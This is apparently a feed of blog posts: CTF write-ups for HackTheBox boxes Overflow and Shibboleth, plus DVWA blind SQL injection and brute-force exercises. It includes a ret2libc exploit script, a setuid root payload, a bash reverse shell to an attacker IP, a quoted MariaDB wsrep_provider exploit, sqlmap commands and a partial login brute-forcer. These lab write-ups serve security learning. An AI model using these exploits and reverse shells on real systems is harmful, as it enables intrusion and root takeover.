<p>A memory address in x86 is 32 bit. Since the destination address is 40 bytes (<code class="language-plaintext highlighter-rouge">0x28</code>) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of <code class="language-plaintext highlighter-rouge">main()</code> (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in <code class="language-plaintext highlighter-rouge">gdb</code>, it worked as expected. The binary is vulnerable to <em>buffer overflow</em> attack;</p>

<p><img src="/assets/img/20220223111853.png" alt="" /></p>

<p>And it gets better too, because ASLR is disabled on the box;</p>

<p><img src="/assets/img/20220223203858.png" alt="" /></p>

<p><br /></p>

<h4 id="exploitation-ret2libc">Exploitation: ret2libc</h4>
<p><br /></p>

<p>The binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is <strong>return to libc</strong> (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">execv</code>), and passing it an argument we control (like the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in the libc library). This works because no code is executed on the stack.</p>

<p>To exploit this, I need to write <strong>44</strong> bytes of padding, followed by the address of <code class="language-plaintext highlighter-rouge">execv()</code> to overwrite the EIP. followed by the address of <code class="language-plaintext highlighter-rouge">exit()</code> which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used <code class="language-plaintext highlighter-rouge">execv()</code> because unlike <code class="language-plaintext highlighter-rouge">system()</code>, it does not drop privileges when spawning a new process.</p>

<p>The first step is figuring out the address of <code class="language-plaintext highlighter-rouge">execv()</code>, <code class="language-plaintext highlighter-rouge">exit()</code>, and the environment variable <code class="language-plaintext highlighter-rouge">PAYLOAD</code> (which I set to the path of my reverse shell). For this, I wrote a simple C program;</p>

<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(){

  printf("Addr of system():   0x%08x\n", &amp;execv);
  printf("Addr of exit():     0x%08x\n", &amp;exit);
  printf("Addr of $PAYLOAD:   0x%08x\n", getenv("PAYLOAD"));
  
  return 0;
}
</code></pre>

<p>Notice how the address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> changes based on the length of the filename;</p>

<p><img src="/assets/img/20220225070759.png" alt="" /></p>

<p>We need to account for this when calling the binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. Since it is 30 characters long, I renamed the address dumper to <code class="language-plaintext highlighter-rouge">/dev/shm/dump_addrssssssssssss</code>. This will give me the correct address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> when calling <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. We now have our valid addresses;</p>

<p><img src="/assets/img/20220225070932.png" alt="" /></p>

<p>Using python, I built a simple <em>ret2libc</em> payload;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">44</span>

<span class="n">execv</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7ea8730</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7e194b0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xffffdf44</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"-202976456"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">execv</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">payload</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>I generated the buffer and saved it in my web directory;</p>

<p><img src="/assets/img/20220225071253.png" alt="" /></p>

<p>On the remote host, I set <code class="language-plaintext highlighter-rouge">PAYLOAD</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;</p>

<p><img src="/assets/img/20220225071317.png" alt="" /></p>

<p><img src="/assets/img/20220225071333.png" alt="" /></p>

<p>So I wrote a simple C payload that will elevate to higher privileges using <code class="language-plaintext highlighter-rouge">setuid()</code> and <code class="language-plaintext highlighter-rouge">setgid()</code> before calling my reverse shell;</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){

  setuid(0);
  setgid(0);
  char *args[] = {"revshell.sh", NULL};
  execv("/dev/shm/revshell.sh", args);
  return 0;
}
</code></pre>

<p>I compiled and pushed the program to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, which is the value in my <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> variable. Running the exploit again, I got a shell on the box as <strong>root</strong>;</p>

<p><img src="/assets/img/20220225072928.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>25</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an open signup on the website, and created a test account.</li>
  <li>Identified a possible username <strong>admin</strong> that exist on the website.</li>
  <li>Used <em>Oracle Padding</em> attack to craft a cookie that gave access to the account of <strong>admin</strong>
    <ul>
      <li>Found an SQL injection vulnerability in <code class="language-plaintext highlighter-rouge">/home/logs.php</code></li>
      <li>Used <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump some hashes, and discovered the domain <strong>devbuild-job.overflow.htb</strong></li>
      <li>Gained access to the domain by cracking the salted hash of the user <strong>editor</strong></li>
    </ul>
  </li>
  <li><strong>devbuild-job.overflow.htb</strong>
    <ul>
      <li>Found a file upload form that is passed to <code class="language-plaintext highlighter-rouge">exiftool</code>.</li>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution as <strong>www-data</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Found 2 local users; <strong>developer</strong>, and <strong>tester</strong> (holds <code class="language-plaintext highlighter-rouge">user.txt</code>)</li>
      <li>Recovered MySQL credentials in config files of <strong>devbuild-job.overflow.htb</strong> domain.</li>
      <li>Gained access to account of <strong>developer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>developer</strong>
    <ul>
      <li>Identified a write access to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> showed requests to <code class="language-plaintext highlighter-rouge">http://taskmanage.overflow.htb/task.sh</code>, which I hijacked by editing the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to gain code execution as <strong>tester</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>tester</strong>
    <ul>
      <li>Found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code></li>
      <li>Binary is protected by a PIN.</li>
      <li>Reversed the binary using <code class="language-plaintext highlighter-rouge">radare2</code> to extract the PIN.</li>
      <li>Identified a <em>buffer overflow</em> vulnerability in the binary.</li>
      <li>Performed a <em>ret2libc</em> attack to gain code execution as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="hard" /><category term="web" /><category term="smtp" /><category term="oracle padding" /><category term="padbuster" /><category term="execute after redirect" /><category term="sql injection" /><category term="sqlmap" /><category term="john" /><category term="python" /><category term="exiftool" /><category term="reverse engineering" /><category term="binary exploitation" /><category term="ret2libc" /><category term="nx" /><category term="radare2" /><summary type="html"><![CDATA[Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.]]></summary></entry><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211113204711.png" alt="" /></p>

<p><img src="/assets/img/20211113204757.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Nov 13 20:49:39 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.124
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 13 20:50:24 2021 -- 1 IP address (1 host up) scanned in 45.09 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211113205454.png" alt="" /></p>

<p>Attempt to send an email using the contact-us form showed an error;</p>

<p><img src="/assets/img/20211113211043.png" alt="" /></p>

<p>Bruteforcing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code> discovered 3;</p>

<p><img src="/assets/img/20211113210249.png" alt="" /></p>

<p>All the three subdomains show the same page;</p>

<p><img src="/assets/img/20211113210547.png" alt="" /></p>

<p>Hovering on the <em>help</em> link below the login form showed a URL to an online documentation that revealed the version number of <em>Zabbix</em>, which is <strong>5.0</strong>. Googling revealed a couple of vulnerabilities that require no authentication, but none of the ones I tested worked.</p>

<p>I was stuck at this for quite a while before remembering to do a UDP scan on the host. This is something I always completely forget to do, which should have been obvious since NMAP only discovered one TCP port on the target. Running <code class="language-plaintext highlighter-rouge">nmap</code> in UDP mode, I got a hit;</p>

<p><img src="/assets/img/20211114120214.png" alt="" /></p>

<p>Service scan with <code class="language-plaintext highlighter-rouge">nmap</code> identified it as <em>asf-rmcp</em>, which according to <em>Tenable</em>, is;</p>

<blockquote>
  <p>ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is <strong>a network protocol used by a management console to remotely control an ASF-aware</strong> host.</p>
</blockquote>

<p>Googling more about the service, the site <em>https://book.hacktricks.xyz</em> has some notes on it;</p>

<p><img src="/assets/img/20211114121645.png" alt="" /></p>

<p>Running the metasploit module showed above, I got a hash for a user named <em>Administrator</em>;</p>

<p><img src="/assets/img/20211114121835.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no trouble cracking it (<code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code>);</p>

<p><img src="/assets/img/20211114122027.png" alt="" /></p>

<p>Using the password, I was able to login to the <em>Zabbix</em> admin dashboard;</p>

<p><img src="/assets/img/20211114152359.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>I have never worked with <em>Zabbix</em> before doing this box, so I had to read quite a bit on how it works. It’s basically a monitoring system used to monitor hosts, also referred to as Zabbix agents. In the <em>Zabbix</em> dashboard, there is an agent with the name <em>shibboleth.htb</em>;</p>

<p><img src="/assets/img/20211114161812.png" alt="" /></p>

<p>I learned that an “item”, which contain a “key”, can be added to an agent, and can be used to automate tasks that need to be performed after a defined interval. The key <code class="language-plaintext highlighter-rouge">system.run[]</code> is of interest to me as it can be used to run shell commands on an agent. Going to the <em>items</em> tab, I was given an option to create a key. So I created one that will ping my attack host after every one minute, and setup <code class="language-plaintext highlighter-rouge">tcpdump</code> to look for ICMP packets. It worked;</p>

<p><img src="/assets/img/20211114162432.png" alt="" /></p>

<p><img src="/assets/img/20211114162545.png" alt="" /></p>

<p>After saving the item, I got a callback after a moment;</p>

<p><img src="/assets/img/20211114162714.png" alt="" /></p>

<p>Adding a bash reverse shell in the <code class="language-plaintext highlighter-rouge">system.run[]</code> key works, but exited immediately after the shell has been spawned. I assumed this is because <em>Zabbix</em> is killing the spawned process, so I wrote a bash script named <code class="language-plaintext highlighter-rouge">shell.sh</code> that spawn a bash reverse shell as a background thread, download it on the host using <code class="language-plaintext highlighter-rouge">curl</code> , and execute it (I used the <code class="language-plaintext highlighter-rouge">test</code> button showed when creating an <code class="language-plaintext highlighter-rouge">Item</code> in <em>Zabbix</em> to run the command right away);</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Spawn the reverse shell in a background thread.</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.138/443 0&gt;&amp;1 &amp;
<span class="c"># Exit the main thread before Zabbix kills it :)</span>
<span class="nb">exit </span>0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I got a stable reverse shell after that as the user <code class="language-plaintext highlighter-rouge">zabbix</code>;</p>

<p><img src="/assets/img/20211116172203.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>There is a user account named <code class="language-plaintext highlighter-rouge">ipmi-svc</code> on the host. Testing the password <code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code> (which is the password for the Zabbix administrator) gave me access to the account, and the user flag;</p>

<p><img src="/assets/img/20211116172527.png" alt="" /></p>

<p>The user does not have any sudo access. <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL service running locally on the host. So I started going through config files, and found a credential in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code>;</p>

<p><img src="/assets/img/20211116173102.png" alt="" /></p>

<p>Using the credential, I was able to access the Zabbix database locally, and found <strong>3</strong> hashes in a table named <code class="language-plaintext highlighter-rouge">users</code>;</p>

<p><img src="/assets/img/20211116173407.png" alt="" /></p>

<p>The hash highlighted above is for a password I already have, and the one for the user <code class="language-plaintext highlighter-rouge">Zabbix</code> could not be cracked after <strong>+30</strong> minutes of bruteforce with <code class="language-plaintext highlighter-rouge">john</code>. So I moved on.</p>

<p>Checking the privileges of the <code class="language-plaintext highlighter-rouge">zabbix</code> MySQL user;</p>

<p><img src="/assets/img/20211116174547.png" alt="" /></p>

<p>Version number of MySQL components;</p>

<p><img src="/assets/img/20211116174652.png" alt="" /></p>

<p>Searching the version numbers using <code class="language-plaintext highlighter-rouge">searchsploit</code>, an exploit was found for the entry highlighted above;</p>

<p><img src="/assets/img/20211116175008.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c"># Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution</span>
<span class="c"># Date: 03/18/2021</span>
<span class="c"># Exploit Author: Central InfoSec</span>
<span class="c"># Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL</span>
<span class="c"># Tested on: Linux</span>
<span class="c"># CVE : CVE-2021-27928</span>

<span class="c"># Proof of Concept:</span>

<span class="c"># Create the reverse shell payload</span>
msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so

<span class="c"># Start a listener</span>
nc <span class="nt">-lvp</span> &lt;port&gt;

<span class="c"># Copy the payload to the target machine (In this example, SCP/SSH is used)</span>
scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so

<span class="c"># Execute the payload</span>
mysql <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span class="nt">-h</span> &lt;ip&gt; <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using the steps outlined above, I generated an <code class="language-plaintext highlighter-rouge">elf</code> reverse shell, download it on the host using <code class="language-plaintext highlighter-rouge">wget</code>, and exploit the flaw to gain root access to the box;</p>

<p><img src="/assets/img/20211116175800.png" alt="" /></p>

<p><img src="/assets/img/20211116175822.png" alt="" /></p>

<p><img src="/assets/img/20211116175839.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified a web service on the host on port <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found <em>Zabbix</em> installation on the host by bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Identified an <code class="language-plaintext highlighter-rouge">asf-rmcp</code> service running on UDP port <strong>623</strong></li>
  <li>Used <code class="language-plaintext highlighter-rouge">auxiliary/scanner/ipmi/ipmi_dumphashes</code> metasploit module, and obtained the password hash of the user <code class="language-plaintext highlighter-rouge">Administrator</code>. Cracking it gave me access to the admin dashboard of Zabbix.</li>
  <li>Inside <em>Zabbix</em> dashboard;
    <ul>
      <li>Found a Zabbix agent with the name <code class="language-plaintext highlighter-rouge">shibboleth.htb</code></li>
      <li>Spawned a shell on it using <code class="language-plaintext highlighter-rouge">system.run[]</code> <em>Item</em> key, which gave me access to the box as <code class="language-plaintext highlighter-rouge">zabbix</code> user.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">zabbix</code>;
    <ul>
      <li>Identified a local user account with the username <code class="language-plaintext highlighter-rouge">ipmi-svc</code>.</li>
      <li>Gained access to the account due to password reuse.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">ipmi-svc</code>;
    <ul>
      <li>Found a credential for the local MySQL service used by the Zabbix installation.</li>
      <li>Identified a vulnerable component used by the server.</li>
      <li>Found an exploit using <code class="language-plaintext highlighter-rouge">searchsploit</code>, which gave me root access to the box.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="zabbix" /><category term="udp" /><category term="ipmi" /><category term="mysql" /><category term="wsrep" /><category term="metasploit" /><category term="asf-rmcp" /><summary type="html"><![CDATA[Shibboleth is a relatively easy medium linux box. It’s running an instance of Zabbix which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port 623 to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.]]></summary></entry><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>

<p><br /></p>

<h3 id="blind-sql-injection---dvwa">Blind SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are given a simple form that checks if a user exists with the given ID;</p>

<p><img src="/assets/img/20220327082816.png" alt="" /></p>

<p>When given an invalid user ID, the application respond with this;</p>

<p><img src="/assets/img/20220327083013.png" alt="" /></p>

<p>The application appears to be vulnerable to <em>blind SQL injection</em> because injecting an SQL query that will always evaluate to true gave a positive output;</p>

<p><img src="/assets/img/20220327083207.png" alt="" /></p>

<p>Blind injections are a pain to exploit manually, so I called in <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327083557.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> database;</p>

<p><img src="/assets/img/20220327083621.png" alt="" /></p>

<p>Contents of <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<p><img src="/assets/img/20220327083912.png" alt="" /></p>

<p>Blind SQL injections can be pretty slow, even with <code class="language-plaintext highlighter-rouge">sqlmap</code>. You can speed up the process by increasing the number of threads using the <code class="language-plaintext highlighter-rouge">--threads</code> argument, but this could easily corrupt the data being dumped when <code class="language-plaintext highlighter-rouge">sqlmap</code> is using a <em>time delay</em> technique in an unstable connection.</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we get a different form where the inputs are predefined in the form;</p>

<p><img src="/assets/img/20220327084414.png" alt="" /></p>

<p>The challenges are looking similar to the ones in error-based SQL injection section. Using a proxy and injecting an SQL query that always evaluate to true gives a positive result, indicating the application is vulnerable;</p>

<p><img src="/assets/img/20220327084936.png" alt="" /></p>

<p><img src="/assets/img/20220327085000.png" alt="" /></p>

<p>This is exploitable using <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327085253.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>This mode is also similar to the <em>high difficulty</em> level of the error-based SQL injection challenge. Only difference is this one is blind;</p>

<p><img src="/assets/img/20220327085544.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting blind SQL injection.]]></summary></entry><entry><title type="html">Bruteforce - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html" rel="alternate" type="text/html" title="Bruteforce - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html"><![CDATA[<p>This is an exercise in OWASP DVWA on login bruteforcing.</p>

<p><br /></p>

<h3 id="bruteforce---dvwa">Bruteforce - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we were presented with a login form;</p>

<p><img src="/assets/img/20220323102403.png" alt="" /></p>

<p>The form is submitted in a GET request with not CSRF tokens;</p>

<p><img src="/assets/img/20220323102539.png" alt="" /></p>

<p>This was a piece of cake to bruteforce using <code class="language-plaintext highlighter-rouge">ffuf</code>. All we had to do is get our session cookie for the application since the form is only accessible by logged in users, and filter out the login error message, which is <code class="language-plaintext highlighter-rouge">Username and/or password incorrect</code>;</p>

<p><img src="/assets/img/20220323102823.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>We get the same login form, and it’s also submitted in a POST request. The only difference I can see is the delay in response by the server. This will slow down bruteforce attacks. Using <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce the login showed some errors, and eventually the whole application appears to hang, even when requesting other pages. However, this delay appears to be tied only to the session cookie I’m using to do the bruteforce because no such delay was observed in another session.</p>

<p><img src="/assets/img/20220323110648.png" alt="" /></p>

<p>The bruteforce succeded after forcing <code class="language-plaintext highlighter-rouge">ffuf</code> to only use a single thread, which is slow;</p>

<p><img src="/assets/img/20220323111121.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>In this mode, we get a similar login form again, but with a CSRF token;</p>

<p><img src="/assets/img/20220323111507.png" alt="" /></p>

<p>Altering the CSRF token showed that it’s being validated by the web application;</p>

<p><img src="/assets/img/20220323111729.png" alt="" /></p>

<table>
  <tbody>
    <tr>
      <td>This means we need to account for this during our bruteforce. Earlier, we [[Initial Access#Making a Bruteforcer</td>
      <td>made something similar]] for bruteforcing the main login page of DVWA.</td>
    </tr>
  </tbody>
</table>

<p>This time, we are going to do something similar, but a little bit more advance. We will make the program multi-threaded.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------
# A bruteforcer for DVWA's bruteforce challenge 3 (high difficulty)
#                                 Author: https://4g3nt47.github.io
#------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">queue</span> <span class="kn">import</span> <span class="n">Queue</span>

<span class="k">class</span> <span class="nc">l3_bruteforcer</span><span class="p">:</span>

  <span class="c1"># The class initializer.
</span>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="n">threads</span><span class="p">):</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">messages</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span> <span class="c1"># Used to queue outputs by threads.
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="c1"># Parse the cookie string (e.g "user=someUser; priv=somePriv"), there is probably a better way to do this :)
</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"; "</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
      <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()]</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
